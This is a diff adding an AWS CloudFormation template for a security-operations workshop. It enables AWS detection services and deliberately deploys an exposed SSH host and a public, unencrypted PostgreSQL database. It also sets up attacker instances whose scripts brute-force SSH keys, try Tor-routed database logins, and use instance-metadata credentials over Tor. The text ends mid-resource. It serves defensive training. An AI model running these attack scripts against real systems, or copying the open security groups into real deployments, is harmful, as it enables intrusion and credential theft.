@@ -1,0 +1,1742 @@
+AWSTemplateFormatVersion: 2010-09-09
+Description: >
+  Agentic Security Operations Workshop - Self-Paced Deployment
+  This template creates all required AWS resources for the autobotAI security workshop.
+  Estimated deployment time: 25-30 minutes
+  Estimated cost: $10-15/day
+
+Metadata:
+  AWS::CloudFormation::Interface:
+    ParameterGroups:
+      - Label:
+          default: "Workshop Configuration"
+        Parameters:
+          - EnvironmentName
+    ParameterLabels:
+      EnvironmentName:
+        default: "Environment Name (used as prefix for resources)"
+
+Parameters:
+  EnvironmentName:
+    Type: String
+    Default: autobotai-workshop
+    Description: Name prefix for all workshop resources
+    AllowedPattern: ^[a-z0-9-]+$
+    ConstraintDescription: Must contain only lowercase letters, numbers, and hyphens
+
+  LatestAmiId:
+    Type: 'AWS::SSM::Parameter::Value<AWS::EC2::Image::Id>'
+    Default: /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-6.1-x86_64
+    Description: Latest Amazon Linux 2023 AMI (auto-resolved)
+
+Resources:
+  # ============================================
+  # SECURITY SERVICES
+  # ============================================
+  
+  # GuardDuty Setup - Uses existing detector or creates new one
+  GuardDutySetupRole:
+    Type: AWS::IAM::Role
+    Metadata:
+      checkov:
+        skip:
+          - id: "CKV_AWS_111"
+            comment: "Workshop setup automation role; GuardDuty detector management requires Resource '*' to provision the demo detector at deploy time."
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
+      Policies:
+        - PolicyName: GuardDutyAccess
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - guardduty:CreateDetector
+                  - guardduty:DeleteDetector
+                  - guardduty:ListDetectors
+                  - guardduty:GetDetector
+                  - guardduty:UpdateDetector
+                Resource: "*"
+
+  GuardDutySetupLambda:
+    Type: AWS::Lambda::Function
+    Properties:
+      FunctionName: !Sub "${EnvironmentName}-guardduty-setup"
+      Runtime: python3.12
+      Handler: index.handler
+      Role: !GetAtt GuardDutySetupRole.Arn
+      Timeout: 60
+      Code:
+        ZipFile: |
+          import boto3
+          import cfnresponse
+          
+          def handler(event, context):
+              gd = boto3.client('guardduty')
+              
+              try:
+                  if event['RequestType'] == 'Delete':
+                      # Don't delete GuardDuty on stack deletion - it may have been pre-existing
+                      cfnresponse.send(event, context, cfnresponse.SUCCESS, {})
+                      return
+                  
+                  # Check if detector already exists
+                  detectors = gd.list_detectors()
+                  
+                  if detectors['DetectorIds']:
+                      detector_id = detectors['DetectorIds'][0]
+                      print(f"Using existing GuardDuty detector: {detector_id}")
+                      
+                      # Ensure all features are enabled on existing detector
+                      try:
+                          gd.update_detector(
+                              DetectorId=detector_id,
+                              Enable=True,
+                              FindingPublishingFrequency='FIFTEEN_MINUTES',
+                              Features=[
+                                  {'Name': 'S3_DATA_EVENTS', 'Status': 'ENABLED'},
+                                  {'Name': 'EKS_AUDIT_LOGS', 'Status': 'ENABLED'},
+                                  {'Name': 'EBS_MALWARE_PROTECTION', 'Status': 'ENABLED'},
+                                  {'Name': 'RDS_LOGIN_EVENTS', 'Status': 'ENABLED'},
+                                  {'Name': 'LAMBDA_NETWORK_LOGS', 'Status': 'ENABLED'},
+                                  {'Name': 'RUNTIME_MONITORING', 'Status': 'ENABLED',
+                                   'AdditionalConfiguration': [
+                                       {'Name': 'EKS_ADDON_MANAGEMENT', 'Status': 'ENABLED'},
+                                       {'Name': 'ECS_FARGATE_AGENT_MANAGEMENT', 'Status': 'ENABLED'},
+                                       {'Name': 'EC2_AGENT_MANAGEMENT', 'Status': 'ENABLED'}
+                                   ]}
+                              ]
+                          )
+                      except Exception as e:
+                          print(f"Could not update detector features: {e}")
+                      
+                      cfnresponse.send(event, context, cfnresponse.SUCCESS, 
+                                      {'DetectorId': detector_id, 'PreExisting': 'true'})
+                  else:
+                      # Create new detector
+                      response = gd.create_detector(
+                          Enable=True,
+                          FindingPublishingFrequency='FIFTEEN_MINUTES',
+                          Features=[
+                              {'Name': 'S3_DATA_EVENTS', 'Status': 'ENABLED'},
+                              {'Name': 'EKS_AUDIT_LOGS', 'Status': 'ENABLED'},
+                              {'Name': 'EBS_MALWARE_PROTECTION', 'Status': 'ENABLED'},
+                              {'Name': 'RDS_LOGIN_EVENTS', 'Status': 'ENABLED'},
+                              {'Name': 'LAMBDA_NETWORK_LOGS', 'Status': 'ENABLED'},
+                              {'Name': 'RUNTIME_MONITORING', 'Status': 'ENABLED',
+                               'AdditionalConfiguration': [
+                                   {'Name': 'EKS_ADDON_MANAGEMENT', 'Status': 'ENABLED'},
+                                   {'Name': 'ECS_FARGATE_AGENT_MANAGEMENT', 'Status': 'ENABLED'},
+                                   {'Name': 'EC2_AGENT_MANAGEMENT', 'Status': 'ENABLED'}
+                               ]}
+                          ]
+                      )
+                      detector_id = response['DetectorId']
+                      print(f"Created new GuardDuty detector: {detector_id}")
+                      cfnresponse.send(event, context, cfnresponse.SUCCESS, 
+                                      {'DetectorId': detector_id, 'PreExisting': 'false'})
+                      
+              except Exception as e:
+                  print(f"Error: {str(e)}")
+                  cfnresponse.send(event, context, cfnresponse.FAILED, {'Error': str(e)})
+
+  EnableGuardDuty:
+    Type: Custom::GuardDutySetup
+    Properties:
+      ServiceToken: !GetAtt GuardDutySetupLambda.Arn
+
+  GuardDutySuppressionRule:
+    Type: AWS::GuardDuty::Filter
+    DependsOn: EnableGuardDuty
+    Properties:
+      DetectorId: !GetAtt EnableGuardDuty.DetectorId
+      Name: SuppressNotRequiredFindings
+      Description: Suppress findings not required for workshop
+      Action: ARCHIVE
+      FindingCriteria:
+        Criterion:
+          type:
+            Eq:
+              - "Recon:IAMUser/TorIPCaller"
+              - "UnauthorizedAccess:IAMUser/MaliciousIPCaller.Custom"
+
+  # GuardDuty SNS Topic for Notifications
+  GuardDutySNSTopic:
+    Type: AWS::SNS::Topic
+    Properties:
+      TopicName: !Sub "${EnvironmentName}-guardduty-topic"
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-guardduty-topic"
+
+  GuardDutySNSTopicPolicy:
+    Type: AWS::SNS::TopicPolicy
+    Properties:
+      PolicyDocument:
+        Id: GuardDutyTopicPolicy
+        Version: 2012-10-17
+        Statement:
+          - Sid: AllowEventsToPublish
+            Effect: Allow
+            Principal:
+              Service: events.amazonaws.com
+            Action: sns:Publish
+            Resource: !Ref GuardDutySNSTopic
+      Topics:
+        - !Ref GuardDutySNSTopic
+
+  # GuardDuty Log Bucket
+  GDLogBucket:
+    Type: AWS::S3::Bucket
+    Metadata:
+      checkov:
+        skip:
+          - id: "CKV_AWS_18"
+            comment: "Log-delivery target bucket (GuardDuty logs); access logging on the log target is not required per CQP approved exception (V2244519294)."
+    Properties:
+      BucketName: !Sub "${EnvironmentName}-guardduty-logs-${AWS::AccountId}"
+      OwnershipControls:
+        Rules:
+          - ObjectOwnership: BucketOwnerPreferred
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: true
+        BlockPublicPolicy: true
+        IgnorePublicAcls: true
+        RestrictPublicBuckets: true
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-guardduty-logs"
+
+  Detective:
+    DependsOn: EnableGuardDuty
+    Type: AWS::Detective::Graph
+
+  # AWS Config
+  ConfigBucket:
+    Type: AWS::S3::Bucket
+    Metadata:
+      checkov:
+        skip:
+          - id: "CKV_AWS_18"
+            comment: "AWS Config delivery (log-target) bucket; access logging not required per CQP approved exception (V2244519294)."
+    Properties:
+      BucketName: !Sub "${EnvironmentName}-config-${AWS::AccountId}"
+      PublicAccessBlockConfiguration:
+        BlockPublicAcls: true
+        BlockPublicPolicy: true
+        IgnorePublicAcls: true
+        RestrictPublicBuckets: true
+
+  ConfigurationRecorderRole:
+    Type: AWS::IAM::Role
+    Properties:
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AWS_ConfigRole
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: config.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: s3-policy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action: s3:PutObject
+                Resource: !Sub "arn:aws:s3:::${ConfigBucket}/*"
+                Condition:
+                  StringLike:
+                    s3:x-amz-acl: bucket-owner-full-control
+              - Effect: Allow
+                Action: s3:GetBucketAcl
+                Resource: !Sub "arn:aws:s3:::${ConfigBucket}"
+
+  DeliveryChannel:
+    Type: AWS::Config::DeliveryChannel
+    Properties:
+      ConfigSnapshotDeliveryProperties:
+        DeliveryFrequency: Six_Hours
+      S3BucketName: !Ref ConfigBucket
+
+  ConfigurationRecorder:
+    Type: AWS::Config::ConfigurationRecorder
+    Properties:
+      RecordingGroup:
+        AllSupported: true
+        IncludeGlobalResourceTypes: true
+      RoleARN: !GetAtt ConfigurationRecorderRole.Arn
+
+  # Security Hub CSPM - the posture-management service that evaluates the
+  # FSBP/CIS controls used in Module 5.
+  SecurityHubEnable:
+    DependsOn:
+      - ConfigurationRecorder
+      - EnableGuardDuty
+    Type: AWS::SecurityHub::Hub
+    Properties:
+      ControlFindingGenerator: "SECURITY_CONTROL"
+      EnableDefaultStandards: true
+  # The new AWS Security Hub (a.k.a. Security Hub V2, the unified experience).
+  # This is a SEPARATE service from Security Hub CSPM above - enabling CSPM alone does
+  # not turn it on. Once enabled, CSPM, GuardDuty and Inspector findings are routed here
+  # automatically and correlated into exposures.
+  # Enabling this also creates the AWSServiceRoleForSecurityHubV2 service-linked role,
+  # service-linked AWS Config recorders, and a service-linked IAM Access Analyzer. Those
+  # operate independently of the ConfigurationRecorder this template creates above.
+  # DependsOn SecurityHubEnable so CSPM is turned on first and ordering is deterministic.
+  SecurityHubV2Enable:
+    DependsOn:
+      - SecurityHubEnable
+    Type: AWS::SecurityHub::HubV2
+    Properties:
+      Tags:
+        Workshop: autobotai-security-workshop
+        Environment: !Ref EnvironmentName
+
+  # Amazon Inspector
+  CustomBackedLambdaToEnableInspectorRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Statement:
+          - Action: sts:AssumeRole
+            Effect: Allow
+            Principal:
+              Service: lambda.amazonaws.com
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/AWSLambdaExecute
+        - arn:aws:iam::aws:policy/AmazonInspector2FullAccess
+
+  CustomBackedLambdaToEnableInspector:
+    Type: AWS::Lambda::Function
+    Properties:
+      Description: Lambda to enable Amazon Inspector v2
+      FunctionName: !Sub "${EnvironmentName}-enable-inspector"
+      Runtime: python3.12
+      Role: !GetAtt CustomBackedLambdaToEnableInspectorRole.Arn
+      Handler: index.lambda_handler
+      Timeout: 90
+      Code:
+        ZipFile: |
+          import cfnresponse
+          import boto3
+          client = boto3.client('inspector2')
+
+          def lambda_handler(event, context):
+              if event.get('RequestType') == 'Create':
+                  response = client.enable(resourceTypes=['EC2','ECR','LAMBDA'])
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {'message': 'Inspector enabled'})
+              elif event.get('RequestType') == 'Delete':
+                  response = client.disable(resourceTypes=['EC2','ECR','LAMBDA'])
+                  cfnresponse.send(event, context, cfnresponse.SUCCESS, {'message': 'Inspector disabled'})
+
+  InvokeCustomLambda:
+    Type: Custom::InvokeCustomLambda
+    Properties:
+      ServiceToken: !GetAtt CustomBackedLambdaToEnableInspector.Arn
+
+  # ============================================
+  # NETWORKING - MAIN VPC
+  # ============================================
+  
+  VPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 10.0.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-main-vpc"
+
+  InternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-igw"
+
+  GatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      InternetGatewayId: !Ref InternetGateway
+      VpcId: !Ref VPC
+
+  RouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref VPC
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-public-rt"
+
+  PublicRoute:
+    DependsOn: GatewayAttachment
+    Type: AWS::EC2::Route
+    Properties:
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref InternetGateway
+      RouteTableId: !Ref RouteTable
+
+  Subnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      CidrBlock: 10.0.0.0/24
+      VpcId: !Ref VPC
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-subnet-1"
+
+  SubnetAssoc1:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      RouteTableId: !Ref RouteTable
+      SubnetId: !Ref Subnet1
+
+  GeneralSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: General security group for workshop instances
+      SecurityGroupEgress:
+        - IpProtocol: tcp
+          FromPort: 0
+          ToPort: 65535
+          CidrIp: 0.0.0.0/0
+      VpcId: !Ref VPC
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-general-sg"
+
+  SSHSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: SSH access - intentionally open for workshop demo
+      VpcId: !Ref VPC
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 22
+          ToPort: 22
+          CidrIp: 0.0.0.0/0
+          Description: SSH access from anywhere - INSECURE for workshop demo
+      SecurityGroupEgress:
+        - IpProtocol: -1
+          CidrIp: 0.0.0.0/0
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-ssh-sg"
+        - Key: Purpose
+          Value: Workshop-SSH-BruteForce-Demo
+
+  WorkshopKey:
+    Type: AWS::EC2::KeyPair
+    Properties:
+      KeyName: !Sub "${EnvironmentName}-key"
+
+  # ============================================
+  # NETWORKING - RDS VPC
+  # ============================================
+  
+  RDSVPC:
+    Type: AWS::EC2::VPC
+    Properties:
+      CidrBlock: 172.16.0.0/16
+      EnableDnsHostnames: true
+      EnableDnsSupport: true
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-vpc"
+
+  RDSSubnet1:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref RDSVPC
+      CidrBlock: 172.16.1.0/24
+      AvailabilityZone: !Select [0, !GetAZs ""]
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-subnet-1"
+
+  RDSSubnet2:
+    Type: AWS::EC2::Subnet
+    Properties:
+      VpcId: !Ref RDSVPC
+      CidrBlock: 172.16.2.0/24
+      AvailabilityZone: !Select [1, !GetAZs ""]
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-subnet-2"
+
+  RDSInternetGateway:
+    Type: AWS::EC2::InternetGateway
+    Properties:
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-igw"
+
+  RDSGatewayAttachment:
+    Type: AWS::EC2::VPCGatewayAttachment
+    Properties:
+      VpcId: !Ref RDSVPC
+      InternetGatewayId: !Ref RDSInternetGateway
+
+  RDSRouteTable:
+    Type: AWS::EC2::RouteTable
+    Properties:
+      VpcId: !Ref RDSVPC
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-rt"
+
+  RDSPublicRoute:
+    DependsOn: RDSGatewayAttachment
+    Type: AWS::EC2::Route
+    Properties:
+      RouteTableId: !Ref RDSRouteTable
+      DestinationCidrBlock: 0.0.0.0/0
+      GatewayId: !Ref RDSInternetGateway
+
+  RDSSubnet1RouteTableAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      SubnetId: !Ref RDSSubnet1
+      RouteTableId: !Ref RDSRouteTable
+
+  RDSSubnet2RouteTableAssociation:
+    Type: AWS::EC2::SubnetRouteTableAssociation
+    Properties:
+      SubnetId: !Ref RDSSubnet2
+      RouteTableId: !Ref RDSRouteTable
+
+  RDSDBSubnetGroup:
+    Type: AWS::RDS::DBSubnetGroup
+    Properties:
+      DBSubnetGroupDescription: Subnet group for RDS
+      SubnetIds:
+        - !Ref RDSSubnet1
+        - !Ref RDSSubnet2
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-subnet-group"
+
+  RDSSecurityGroup:
+    Type: AWS::EC2::SecurityGroup
+    Properties:
+      GroupDescription: RDS security group - intentionally misconfigured for workshop
+      VpcId: !Ref RDSVPC
+      SecurityGroupIngress:
+        - IpProtocol: tcp
+          FromPort: 5432
+          ToPort: 5432
+          CidrIp: 0.0.0.0/0
+          Description: PostgreSQL access from anywhere - INSECURE for workshop demo
+      SecurityGroupEgress:
+        - IpProtocol: -1
+          CidrIp: 0.0.0.0/0
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-rds-sg"
+
+  # ============================================
+  # IAM ROLES
+  # ============================================
+  
+  GeneralInstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: ec2.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM
+        - arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess
+      Policies:
+        - PolicyName: GeneralInstancePolicy
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - ssm:GetParameter
+                  - ssm:GetParameters
+                  - ssm:DescribeParameters
+                Resource: !Sub "arn:aws:ssm:${AWS::Region}:${AWS::AccountId}:*"
+
+  GeneralInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      Roles:
+        - !Ref GeneralInstanceRole
+
+  RDSEnhancedMonitoringRole:
+    Type: AWS::IAM::Role
+    Properties:
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: monitoring.rds.amazonaws.com
+            Action: sts:AssumeRole
+      ManagedPolicyArns:
+        - arn:aws:iam::aws:policy/service-role/AmazonRDSEnhancedMonitoringRole
+
+  # ============================================
+  # DATABASES
+  # ============================================
+  
+  PostgreSQLSecret:
+    Type: AWS::SecretsManager::Secret
+    Properties:
+      Name: !Sub "${EnvironmentName}-postgres-secret"
+      Description: PostgreSQL database password
+      GenerateSecretString:
+        SecretStringTemplate: '{"username": "postgres"}'
+        GenerateStringKey: password
+        PasswordLength: 16
+        ExcludeCharacters: '"@/\'
+
+  PostgreSQLDatabase:
+    Type: AWS::RDS::DBInstance
+    Metadata:
+      checkov:
+        skip:
+          - id: "CKV_AWS_17"
+            comment: "Intentionally public RDS instance used to generate GuardDuty findings for the workshop."
+          - id: "CKV_AWS_161"
+            comment: "IAM database authentication intentionally omitted; password auth is required to produce the GuardDuty RDS findings taught in the workshop."
+    DependsOn:
+      - RDSPublicRoute
+      - RDSSubnet1RouteTableAssociation
+      - RDSSubnet2RouteTableAssociation
+    DeletionPolicy: Delete
+    Properties:
+      DBInstanceIdentifier: !Sub "${EnvironmentName}-postgres"
+      DBInstanceClass: db.t3.micro
+      Engine: postgres
+      EngineVersion: "16.9"
+      MasterUsername: postgres
+      MasterUserPassword: !Sub "{{resolve:secretsmanager:${PostgreSQLSecret}:SecretString:password}}"
+      AllocatedStorage: 20
+      StorageType: gp2
+      DBSubnetGroupName: !Ref RDSDBSubnetGroup
+      VPCSecurityGroups:
+        - !Ref RDSSecurityGroup
+      PubliclyAccessible: true
+      BackupRetentionPeriod: 0
+      MultiAZ: false
+      StorageEncrypted: false
+      DeletionProtection: false
+      EnablePerformanceInsights: false
+      MonitoringInterval: 0
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-postgres"
+        - Key: Purpose
+          Value: GuardDuty-Workshop-Demo
+
+  # ============================================
+  # EC2 INSTANCES - ATTACK SIMULATION
+  # ============================================
+  
+  AttackerInstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub "${EnvironmentName}-attacker-role"
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: ec2.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: AttackerMinimalAccess
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - ec2:DescribeInstances
+                  - rds:DescribeDBInstances
+                  - rds:DescribeDBClusters
+                Resource: "*"
+
+  AttackerInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      InstanceProfileName: !Sub "${EnvironmentName}-attacker-profile"
+      Roles:
+        - !Ref AttackerInstanceRole
+
+
+  AttackerInstance:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t3.micro
+      ImageId: !Sub "{{resolve:ssm:/aws/service/canonical/ubuntu/server/20.04/stable/current/amd64/hvm/ebs-gp2/ami-id}}"
+      IamInstanceProfile: !Ref AttackerInstanceProfile
+      KeyName: !Ref WorkshopKey
+      NetworkInterfaces:
+        - AssociatePublicIpAddress: true
+          DeviceIndex: "0"
+          GroupSet:
+            - !Ref GeneralSecurityGroup
+          SubnetId: !Ref Subnet1
+      UserData:
+        Fn::Base64: !Sub |
+          #!/bin/bash
+          # Disable SSM Agent
+          systemctl stop amazon-ssm-agent
+          systemctl disable amazon-ssm-agent
+
+          apt update && apt upgrade -y
+          apt install -y nmap python3 python3-pip awscli postgresql-client tor jq netcat-openbsd
+
+          # Setup Tor
+          cat >> /etc/tor/torrc << 'EOFTOR'
+          ControlPort 9051
+          CookieAuthentication 0
+          EOFTOR
+          systemctl enable tor
+          systemctl start tor
+
+          # Install Crowbar for SSH brute force simulation
+          git clone https://github.com/galkan/crowbar /home/ubuntu/crowbar
+          cd /home/ubuntu/crowbar
+          pip3 install -r requirements.txt
+
+          # Create compromised SSH keys
+          mkdir /home/ubuntu/compromised_keys
+          curl -L https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/never_used_sample_key.foo > /home/ubuntu/compromised_keys/compromised.pem
+          for FILE in {1..20}; do
+            cp /home/ubuntu/compromised_keys/compromised.pem /home/ubuntu/compromised_keys/compromised$FILE.pem
+          done
+
+          # Create user list
+          cat <<"EOF" >/home/ubuntu/users
+          ec2-user
+          root
+          admin
+          ubuntu
+          EOF
+
+          # Create SSH attack script
+          cat > /home/ubuntu/ssh_attack.sh << 'EOFSCRIPT'
+          #!/bin/bash
+          echo "Starting SSH key brute force attack simulation..."
+          LINUX_IP=$(aws ec2 describe-instances \
+            --filters "Name=tag:Name,Values=${EnvironmentName}-vulnerable-ssh" "Name=instance-state-name,Values=running" \
+            --query 'Reservations[0].Instances[0].PrivateIpAddress' \
+            --output text --region ${AWS::Region})
+
+          if [ "$LINUX_IP" != "None" ] && [ "$LINUX_IP" != "" ]; then
+            echo "Targeting SSH instance at: $LINUX_IP"
+            for j in `seq 1 20`; do
+              sudo python3 /home/ubuntu/crowbar/crowbar.py -b sshkey -s $LINUX_IP/32 -U /home/ubuntu/users -k /home/ubuntu/compromised_keys &> /dev/null
+            done
+            echo "SSH key brute force simulation completed"
+          fi
+          EOFSCRIPT
+          chmod +x /home/ubuntu/ssh_attack.sh
+          chown -R ubuntu:ubuntu /home/ubuntu
+
+          # Create automated attack scheduler
+          cat > /home/ubuntu/run_attacks.sh << 'EOFAUTO'
+          #!/bin/bash
+          sleep 300
+          for i in {1..6}; do
+            echo "[$(date)] Running SSH attack attempt $i of 6"
+            /home/ubuntu/ssh_attack.sh >> /home/ubuntu/attack_log.txt 2>&1
+            if [ $i -lt 6 ]; then
+              sleep 300
+            fi
+          done
+          EOFAUTO
+          chmod +x /home/ubuntu/run_attacks.sh
+          chown ubuntu:ubuntu /home/ubuntu/run_attacks.sh
+          nohup sudo -u ubuntu /home/ubuntu/run_attacks.sh &
+
+          # Create RDS attack script
+          cat > /home/ubuntu/rds_attack.sh << 'EOFRDS'
+          #!/bin/bash
+          echo "Starting RDS Tor-based attack simulation..."
+          systemctl start tor
+          sleep 10
+
+          POSTGRES_ENDPOINT=$(aws rds describe-db-instances \
+            --db-instance-identifier "${EnvironmentName}-postgres" \
+            --query 'DBInstances[0].Endpoint.Address' \
+            --output text --region ${AWS::Region})
+
+          if [ "$POSTGRES_ENDPOINT" != "None" ] && [ "$POSTGRES_ENDPOINT" != "" ]; then
+            echo "Targeting PostgreSQL at: $POSTGRES_ENDPOINT via Tor"
+            for i in {1..5}; do
+              timeout 15 torify nc -zv $POSTGRES_ENDPOINT 5432 2>&1 | head -2
+              sleep 2
+            done
+            for i in {1..3}; do
+              PGPASSWORD='wrongpassword' timeout 20 torify psql -h $POSTGRES_ENDPOINT -p 5432 -U postgres -d postgres -c "SELECT 1;" 2>&1 | head -3
+              sleep 2
+            done
+          fi
+          EOFRDS
+          chmod +x /home/ubuntu/rds_attack.sh
+
+          # Run RDS attacks
+          cat > /home/ubuntu/run_rds_attacks.sh << 'EOFRDSAUTO'
+          #!/bin/bash
+          sleep 600
+          while true; do
+            /home/ubuntu/rds_attack.sh >> /home/ubuntu/rds_attack_log.txt 2>&1
+            sleep 180
+          done
+          EOFRDSAUTO
+          chmod +x /home/ubuntu/run_rds_attacks.sh
+          chown ubuntu:ubuntu /home/ubuntu/run_rds_attacks.sh
+          nohup sudo -u ubuntu /home/ubuntu/run_rds_attacks.sh &
+      Tags:
+        - Key: Name
+          Value: !Sub "${EnvironmentName}-red-team-attacker"
+        - Key: Purpose
+          Value: Attack-Simulation
+
+  VulnerableInstanceRole:
+    Type: AWS::IAM::Role
+    Properties:
+      RoleName: !Sub "${EnvironmentName}-vulnerable-role"
+      AssumeRolePolicyDocument:
+        Version: 2012-10-17
+        Statement:
+          - Effect: Allow
+            Principal:
+              Service: ec2.amazonaws.com
+            Action: sts:AssumeRole
+      Policies:
+        - PolicyName: VulnerableInstanceAccess
+          PolicyDocument:
+            Version: 2012-10-17
+            Statement:
+              - Effect: Allow
+                Action:
+                  - sts:GetCallerIdentity
+                  - ec2:DescribeInstances
+                  - s3:ListAllMyBuckets
+                  - s3:ListBucket
+                  - iam:ListUsers
+                  - secretsmanager:GetSecretValue
+                Resource: "*"
+
+  VulnerableInstanceProfile:
+    Type: AWS::IAM::InstanceProfile
+    Properties:
+      InstanceProfileName: !Sub "${EnvironmentName}-vulnerable-profile"
+      Roles:
+        - !Ref VulnerableInstanceRole
+
+  VulnerableSSHInstance:
+    Type: AWS::EC2::Instance
+    Properties:
+      InstanceType: t3.micro
+      ImageId: !Sub "{{resolve:ssm:/aws/service/canonical/ubuntu/server/20.04/stable/current/amd64/hvm/ebs-gp2/ami-id}}"
+      IamInstanceProfile: !Ref VulnerableInstanceProfile
+      KeyName: !Ref WorkshopKey
+      NetworkInterfaces:
+        - AssociatePublicIpAddress: true
+          DeviceIndex: "0"
+          GroupSet:
+            - !Ref SSHSecurityGroup
+          SubnetId: !Ref Subnet1
+      UserData:
+        Fn::Base64: !Sub |
+          #!/bin/bash -xe
+          apt update && apt upgrade -y
+          apt install -y openssh-server python3-pip unzip tor jq netcat-openbsd
+
+          # Install AWS CLI v2
+          curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
+          unzip awscliv2.zip
+          sudo ./aws/install
+          rm -rf awscliv2.zip aws/
+
+          # Enable SSH
+          systemctl enable ssh
+          systemctl start ssh
+          echo "LogLevel VERBOSE" >> /etc/ssh/sshd_config
+          systemctl restart ssh
+
+          pip3 install aws-consoler
+
+          # Setup Tor
+          cat >> /etc/tor/torrc << 'EOFTOR'
+          ControlPort 9051
+          CookieAuthentication 0
+          EOFTOR
+          systemctl enable tor
+          systemctl start tor
+
+          # Create credential exfiltration script
+          cat > /home/ubuntu/credential_exfiltration.sh << 'EOFCRED'
+          #!/bin/bash
+          echo "Starting credential exfiltration simulation..."
+          EC2_TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+          ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $EC2_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+
+          if [ -n "$ROLE_NAME" ]; then
+            ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $EC2_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
+            export AWS_ACCESS_KEY_ID=$(echo $ROLE | jq -r .AccessKeyId)
+            export AWS_SECRET_ACCESS_KEY=$(echo $ROLE | jq -r .SecretAccessKey)
+            export AWS_SESSION_TOKEN=$(echo $ROLE | jq -r .Token)
+            export AWS_DEFAULT_REGION=${AWS::Region}
+
+            echo -e 'AUTHENTICATE ""\r\nsignal NEWNYM\r\nQUIT' | nc 127.0.0.1 9051
+            sleep 5
+
+            torify aws sts get-caller-identity
+            torify aws ec2 describe-instances --max-items 1
+            torify aws s3 ls
+            torify aws iam list-users --max-items 1
+          fi
+          EOFCRED
+          chmod +x /home/ubuntu/credential_exfiltration.sh
+          chown ubuntu:ubuntu /home/ubuntu/credential_exfiltration.sh
+
+          # Auto-run credential exfiltration after 10 minutes
+          (sleep 600; sudo -u ubuntu /home/ubuntu/credential_exfiltration.sh) &
+      Tags:
+        - Key: Name
